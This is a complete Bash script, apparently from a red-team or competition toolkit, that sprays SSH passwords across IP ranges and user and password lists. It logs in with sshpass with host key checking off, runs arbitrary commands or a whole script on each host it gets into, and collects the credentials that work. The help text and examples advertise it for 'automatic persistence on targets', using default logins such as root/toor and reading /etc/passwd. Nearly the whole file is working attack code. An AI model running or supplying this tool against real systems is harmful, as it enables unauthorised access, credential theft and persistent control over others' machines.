#!/usr/bin/env bash
#
# Automatically logs into the given targets using the given usernames and
# passwords, running the provided commands.
#
# Known issues:
#   local-troll.sh makes the SSH connection impossible because it's infinitely
#   playing Rick Astley's "Never Gonna Give You Up" in the terminal upon login.
#   FIXED, by unquoting the "bash -c" part of the command.
#
# To-Do:
#   Option to save discovered credentials to a file
#   Option to log SSH output to a file

# *** Source library functions ***

. ./lib-cecho.sh      2>/dev/null
. ./lib-root_check.sh 2>/dev/null
. ./lib-expand_ips.sh 2>/dev/null
. ./lib-exists.sh     2>/dev/null


# *** Configuration variables ***

#DEFAULT_COMMANDS="hostname && whoami && head -n 3 /etc/passwd"
#DEFAULT_USER='zathras'
#DEFAULT_PASSWORD='password1!'

BANNER="${PURPLE}"' ____                      _            ____                                  
|  _ \ ___ _ __ ___   ___ | |_ ___     / ___| _ __  _ __ __ _ _   _  ___ _ __ 
| |_) / _ \ '\''_ ` _ \ / _ \| __/ _ \____\___ \| '\''_ \| '\''__/ _` | | | |/ _ \ '\''__|
|  _ <  __/ | | | | | (_) | ||  __/_____|__) | |_) | | | (_| | |_| |  __/ |   
|_| \_\___|_| |_| |_|\___/ \__\___|    |____/| .__/|_|  \__,_|\__, |\___|_|   
      '"${COLOR_OFF}${CYAN}"'By: Christian'"${COLOR_OFF}${PURPLE}"'                          |_|              |___/'"${COLOR_OFF}
"


# *** Helper functions ***

print_help() {
	echo -e "${CYAN}Remote Sprayer${COLOR_OFF} - ${YELLOW}Automatic persistence on targets via SSH password spraying${COLOR_OFF}"
	echo -e "    ${GREEN}Usage: $0 [-u|--user|-U|--users] [-p|--password|-P|--passwords] <target>${COLOR_OFF}"
	echo -e "           ${GREEN}$0 [-u|--user|-U|--users] [-p|--password|-P|--passwords] {-T|--targets}${COLOR_OFF}"
	echo
	echo -e "${BOLD_WHITE}TARGET(S):${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}<target>:${COLOR_OFF} A valid hostname, IP address, or IP address range that can be understood by Nmap"
	echo -e "    ${BOLD_WHITE}-T|--targets <targets_file>:${COLOR_OFF} Path to a file containing targets, one target per line"
	echo -e "${BOLD_WHITE}COMMANDS:${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}<command>:${COLOR_OFF} The command to run on the target system if successfully authenticated via SSH" # ${BOLD_WHITE}(default: $DEFAULT_COMMANDS)${COLOR_OFF}
	echo -e "    ${BOLD_WHITE}-C|--commands <commands_file>:${COLOR_OFF} Path to a file containing a Bash script to run on the target if successfully authenticated"
	echo -e "${BOLD_WHITE}USER(S):${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}-p|--password <password>:${COLOR_OFF} A password to authenticate with for each user logon attempt"
	echo -e "    ${BOLD_WHITE}-P|--passwords <passwords_file>:${COLOR_OFF} Path to a file containing passwords, one password per line"
	echo -e "${BOLD_WHITE}PASSWORD(S):${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}-u|--user <user>:${COLOR_OFF} A user to authenticate as on each target ${BOLD_WHITE}"
	echo -e "    ${BOLD_WHITE}-U|--users <users_file>:${COLOR_OFF} Path to a file containing users, one user per line"
	echo -e "${BOLD_WHITE}SWITCHES:${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}-q|--quiet:${COLOR_OFF} Don't print the banner ASCII art"
	echo -e "${BOLD_WHITE}HELP:${COLOR_OFF}"
	echo -e "    ${BOLD_WHITE}-h|--help:${COLOR_OFF} Print this usage information"
	echo
	echo -e "${BOLD_WHITE}EXAMPLES:${COLOR_OFF}"
	echo "    ./remote-sprayer.sh -u root -p toor 192.168.1.0-10 \"hostname && id\""
	echo "    ./remote-sprayer.sh -u admin -p admin 192.168.1-8.65 \"cat /etc/passwd\""
	echo "    ./remote-sprayer.sh -U ./users.txt -p 'password1!' myhostname \"hostname && id\""
	echo "    ./remote-sprayer.sh -U ./users.txt -P ./passwords.txt -T ./targets.txt -C ./my_script.sh"
}

ssh_login() {
	if [ $# -ne 3 ]; then
		cecho error "ssh_login usage: ssh_login <user> <password> <target>"
		return 1
	fi

	local user="$1"
	local password="$2"
	local target="$3"

	local creds_format="$u:$p@$t"

	cecho sep "-"

	# Always save the stderr by redirecting it to stdout, just because I always want to see it
	if [ ! -z "$command" ]; then # execute single command
		ssh_output=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectionAttempts=2 -o ConnectTimeout=2 -o ServerAliveInterval=2 -o ServerAliveCountMax=2 "$user"@"$target" bash -c "$command" 2>&1)
	elif [ ! -z "$commands_file" ]; then # execute script
		ssh_output=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectionAttempts=2 -o ConnectTimeout=2 -o ServerAliveInterval=2 -o ServerAliveCountMax=2 "$user"@"$target" bash -s < "$commands_file" 2>&1)
	fi

	sshpass_exit_code=$?

	echo "$ssh_output"

	cecho sep "-"

	# Check the exit status of the SSH login and command execution
	case $sshpass_exit_code in
		0)
			cecho info "Valid credentials! => $creds_format"
			return 0
			;;
		1)
			cecho error "Invalid command line argument => $creds_format"
			return 1
			;;
		2)
			cecho error "Conflicting arguments => $creds_format"
			return 1
			;;
		3)
			cecho error "General runtime error => $creds_format"
			return 1
			;;
		4)
			cecho error "SSH parsing error => $creds_format"
			return 1
			;;
		5)
			cecho warning "Invalid password => $creds_format"
			return 1
			;;
		255)
			if grep -q "timed out" <<< "$ssh_output"; then
				cecho error "SSH connection timed out, skipping target '$target'"
				return 2
			elif grep -q "not resolve" <<< "$ssh_output"; then
				cecho error "Could not resolve hostname, skipping target '$target'"
				return 3
			else
				cecho warning "Could not authenticate => $creds_format"
				return 1
			fi
			;;
		*)
			cecho warning "Valid credentials, but command executed with errors => $creds_format"
			return 0
			;;
	esac
}


# *** Argument parsing ***

# Boilerplate from: https://stackoverflow.com/questions/192249/how-do-i-parse-command-line-arguments-in-bash

# Command-line argument parsing
# Reference: https://stackoverflow.com/a/29754866
getopt --test > /dev/null
if [ $? -ne 4 ]; then
	cecho error "Your getopt version is out of date according to \`getopt --test\`. Exiting."
	exit 1
fi

# "a"  = enable the flag (boolean, true)
# "a:" = requires a value
OPTIONS=T:C:u:U:p:P:qh
LONGOPTS=targets:,commands:user:,users:,password:,passwords:,quiet,help

# -temporarily store output to be able to check for errors
# -activate quoting/enhanced mode (e.g. by writing out “--options”)
# -pass arguments only via   -- "$@"   to separate them correctly
PARSED=$(getopt --options=$OPTIONS --longoptions=$LONGOPTS --name "$0" -- "$@")
if [ $? -ne 0 ]; then
	# e.g. return value is 1
	# then getopt has complained about wrong arguments to stdout
	print_help
	exit 2
fi
# read getopt’s output this way to handle the quoting right:
eval set -- "$PARSED"

# Mandatory flag values
target_file=""
commands_file=""
user=""
users_file=""
password=""
passwords_file=""
print_banner=true

# now enjoy the options in order and nicely split until we see --
while true; do
	case "$1" in
#		-t|--target)
#			target="$2"
#			shift 2
#			;;
		-T|--targets)
			targets_file="$2"
			shift 2
			;;
		-C|--commands)
			commands_file="$2"
			shift 2
			;;
		-u|--user)
			user="$2"
			shift 2
			;;
		-U|--users)
			users_file="$2"
			shift 2
			;;
		-p|--password)
			password="$2"
			shift 2
			;;
		-P|--passwords)
			passwords_file="$2"
			shift 2
			;;
		-q|--quiet)
			print_banner=false
			shift
			;;
		-h|--help)
			print_help
			exit 0
			;;
		--)
			shift
			break
			;;
		*)
			cecho error "Command-line argument parsing programming error"
			exit 3
			;;
	esac
done

# Handle mandatory non-flag arguments (starts at $1 like normal)
# There could be two, one, or no arguments, depending on the flags used
if [ -z "$targets_file" ]; then
	target="$1"
	if [ -z "$commands_file" ]; then
		command="$2"
	fi
elif [ -z "$commands_file" ]; then
	command="$1"
fi

# Ensure all mandatory arguments are provided
if [ -z "$target" ] && [ -z "$targets_file" ]; then
	cecho error "Must provide a target or targets file"
	invalid_usage=true
fi

if [ -z "$command" ] && [ -z "$commands_file" ]; then
	cecho error "Must provide a command or commands file"
	invalid_usage=true
fi

if [ -z "$user" ] && [ -z "$users_file" ]; then
	cecho error "Must provide a user or users file"
	invalid_usage=true
fi

if [ -z "$password" ] && [ -z "$passwords_file" ]; then
	cecho error "Must provide a password or passwords file"
	invalid_usage=true
fi

if [ "$invalid_usage" = true ]; then
	print_help
	exit 1
fi


# *** Process command-line arguments ***

# Print the ASCII banner
[ $print_banner = true ] && echo -e "$BANNER"

target_list=""
user_list=""
password_list=""

# 'test -n "$thing"' was giving me issues later in this script, so I just
# replaced all occurrences with 'test ! -z "$thing"' to be safe

# If single target
if [ ! -z "$target" ]; then 
	target_list=$(expand_ips "$target")
	if [ $? -ne 0 ]; then
		cecho error "Nmap is unable to parse '$target' as a valid target or target range"
		exit 1
	fi
else # At this point, must be a targets file
	# Check if file exists
	if [ ! -f "$targets_file" ]; then
		cecho error "Targets file '$targets_file' does not exist"
		exit 1
	fi

	# Check if file is readable
	if [ ! -r "$targets_file" ]; then
		cecho error "Unable to read targets file '$targets_file'"
		exit 1
	fi

	target_list=$(cat "$targets_file")
fi

# If single user
if [ ! -z "$user" ]; then
	user_list="$user"
else # At this point, must be a users file
	# Check if file exists
	if [ ! -f "$users_file" ]; then
		cecho error "Users file '$users_file' does not exist"
		exit 1
	fi

	# Check if file is readable
	if [ ! -r "$users_file" ]; then
		cecho error "Unable to read users file '$users_file'"
		exit 1
	fi

	user_list=$(cat "$users_file")
fi

# If single password
if [ ! -z "$password" ]; then
	password_list="$password"
else # At this point, must be a passwords file
	# Check if file exists
	if [ ! -f "$passwords_file" ]; then
		cecho error "Passwords file '$passwords_file' does not exist"
		exit 1
	fi

	# Check if file is readable
	if [ ! -r "$passwords_file" ]; then
		cecho error "Unable to read passwords file '$passwords_file'"
		exit 1
	fi

	password_list=$(cat "$passwords_file")
fi


# *** Main ***

cecho task "Attempting Logins"

### Expect was glitchy, used sshpass instead
## Ensure 'expect' is present
#if ! exists expect; then
# cecho error "'expect' not found, exiting"
#	exit 1
#fi

if ! exists sshpass; then
  cecho error "'sshpass' required but not found, exiting"
	exit 1
fi

# Hold all discovered credentials per target
declare -A all_credentials

# Iterate over ever possible login
while read -r t; do

	skip_target=false

	# To clear an associative array, you must 'unset' then re-declare it
	declare -A target_credentials

	while read -r u; do

		# If we can't connect to the SSH server on the target, no point in trying
		# to keep connecting to it.
		if [ $skip_target = true ]; then
			break
		fi

		successful_login=false

		### Cache only checks user at current target, which we wouldn't need to
		### test any more, so it's kinda pointless.
		## Cache for optimization
		#if [ ! -z "${target_credentials["${u}"]}" ]; then
		#	echo
		#	cecho info "Trying known credentials - $u:$p"
		#	ssh_login "$u" "${target_credentials["${u}"]}" "$t" "$commands"

		#	if [ $? -eq 0 ]; then
		#		successful_login=true
		#	fi
		#fi

		while read -r p; do

			echo
			cecho log "Brute forcing login: $u:$p@$t"
			### Expect was glitchy, used sshpass instead
			## Below expect code assisted by:
			## - https://linuxaria.com/howto/2-practical-examples-of-expect-on-the-linux-cli
			## - https://serverfault.com/questions/241588/how-to-automate-ssh-login-with-password

			## --- Automatic SSH login and command execution using expect
			## Don't save expect commands to our .bash_history since it would expose
			## credentials
			#export HISTIGNORE="expect*"
			## Read `man expect` to learn more; there's a lot of detail

			## expect has weird issues for SSH when ran on CentOS systems like no
			## command results being printed to stdout. Replace with 'sshpass' or
			## 'runoverssh' instead? Look into alternatives.
			#expect <<- EOD
				## The value of timeout must be an integral number of seconds.
				## Normally timeouts are nonnegative, but the special case of -1
				## signifies that expect #should wait forever.
				#set timeout 15

				## Don't print send/expect dialogue to stdout
				##log_user 0

				## Now we can connect to the remote server/port with our username and
				## password. The command spawn is used to execute another process:
				#spawn -noecho ssh -o StrictHostKeyChecking=no -o NumberOfPasswordPrompts=1 -o ConnectionAttempts=2 -o ConnectTimeout=2 -o ServerAliveInterval=2 -o ServerAliveCountMax=2 $u@$t "$commands"

				## Now we expect to have a request for password:
				#expect {
				#	"?assword:" { # Valid host
				#		# At this point we want to see stdout
				#		#log_user 1

				#		# And we send our password:
				#		send -- "$p\r"

				#		# Check for invalid password
				#		expect_background "?ermission denied" {
				#			exit 1
				#		}

				#		# send blank line (\r) to make sure we get back to cli
				#		send -- "\r"

				#		# No need to 'exit' the SSH session. We've already exited our
				#		# commands, so the server will close the connection for us.

				#		# In this block we can specify any final actions to carry out,
				#		# though we don't want to in this case:
				#		# (Note: It also seems like CentOS boxes don't trigger an EOF when
				#		#        the session is closed? They also still print out the
				#		#        password prompt to stdout, necessitating the earlier
				#		#        'log_user 0' statement.)
				#		#expect eof
				#	} "?ermission denied" {
				#		exit 2
				#	} "*timed out" {
				#		exit 3
				#	} "unreachable" { # Invalid host
				#		exit 4
				#	} "not resolve hostname" { # Invalid host
				#		exit 5
				#	}
				#}
			#EOD

			#expect_exit_code=$?

			## Reset HISTIGNORE
			#export HISTIGNORE=""

			ssh_login "$u" "$p" "$t"

			ssh_login_status=$?

			# Store valid credentials and break from for loop, no need to try more
			# passwords
			if [ $ssh_login_status -eq 0 ]; then
				successful_login=true
				target_credentials["$u"]="$u:$p"
				break
			elif [ $ssh_login_status -eq 2 ]; then
				skip_target=true	
				target_credentials["Timed out"]="timed_out"
				break
			elif [ $ssh_login_status -eq 3 ]; then
				skip_target=true	
				target_credentials["Unknown host"]="unknown_host"
				break
			fi

		done <<< "$password_list"

		if [ $successful_login = false ]; then
			cecho warning "--- No credentials found - $u@$t"
		fi
	done <<< "$user_list"

	all_credentials["$t"]="${target_credentials[@]}"
	unset target_credentials # clear the associative array for the next iteration

done <<< "$target_list"

echo
cecho done "Done Login Attempts"

cecho task "Printing All Discovered Credentials"
echo
for target in ${!all_credentials[@]}; do
	cecho log "Credentials for $target:"
	if [ ! -z "${all_credentials["$target"]}" ]; then
		for creds in ${all_credentials["$target"]}; do
			if [ "$creds" = "timed_out" ]; then
				cecho error "Timed out"
			elif [ "$creds" = "unknown_host" ]; then
				cecho error "Could not resolve hostname"
			else
				cecho info "$creds"
			fi
		done
	else
		cecho warning "None"
	fi
done

echo
cecho done "--- Done! ---"


#echo "target: '$target', targets_file: '$targets_file', user: '$user', users_file: '$users_file', password: '$password', passwords_file: '$passwords_file', in: '$1'"
